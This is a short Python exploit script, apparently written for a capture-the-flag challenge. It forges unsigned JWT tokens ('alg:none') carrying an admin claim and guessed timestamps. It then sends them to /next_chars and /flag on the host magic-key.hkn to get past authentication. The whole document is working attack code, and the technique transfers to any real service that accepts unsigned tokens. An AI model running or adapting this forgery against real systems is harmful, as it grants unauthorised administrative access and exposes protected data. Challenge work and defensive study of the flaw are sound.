#!/usr/bin/env python3
"""
JWT 'alg:none' forgery mod magic-key.hkn, med timestamp fra footer-datoen (02-01-1970).
Kør paa din egen Kali-maskine.
"""
import base64, json
import urllib.request

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

timestamps = {
    "86400 (2 jan 1970, DD-MM-YYYY)": 86400,
    "2678400 (1 feb 1970, MM-DD-YYYY)": 2678400,
}

paths = ["/next_chars", "/flag"]

for label, ts in timestamps.items():
    header = {"alg": "none", "typ": "JWT"}
    payload = {"admin": True, "timestamp": ts}
    h = b64url(json.dumps(header, separators=(',', ':')).encode())
    p = b64url(json.dumps(payload, separators=(',', ':')).encode())

    for tok in (f"{h}.{p}.", f"{h}.{p}"):
        print(f"\n=== {label} | token ending: ...{tok[-15:]} ===")
        for path in paths:
            url = f"http://magic-key.hkn{path}"
            req = urllib.request.Request(url, headers={"JWT": tok})
            try:
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = resp.read().decode(errors="replace")
                    print(f"[{resp.status}] {path} -> {body[:400]}")
            except urllib.error.HTTPError as e:
                body = e.read().decode(errors="replace")
                print(f"[{e.code}] {path} -> {body[:400]}")
            except Exception as e:
                print(f"[ERR] {path} -> {e}")
